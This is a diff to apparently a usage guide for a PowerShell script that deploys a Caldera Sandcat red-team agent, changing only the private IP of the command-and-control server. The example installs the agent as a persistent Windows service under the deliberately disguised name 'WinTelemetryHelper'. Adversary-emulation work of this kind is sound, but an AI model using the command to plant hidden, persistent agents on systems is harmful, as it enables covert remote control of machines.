@@ -124,7 +124,7 @@ Set-ExecutionPolicy RemoteSigned -Scope Process -Force
 **Persistent service with a blended service name:**
 ```powershell
 .\Deploy-SandcatAgent.ps1 `
-    -CalderaServer  "http://192.168.10.100:8888" `
+    -CalderaServer  "http://192.168.10.108:8888" `
     -Group          "red" `
     -InstallAsService `
     -ServiceName    "WinTelemetryHelper"
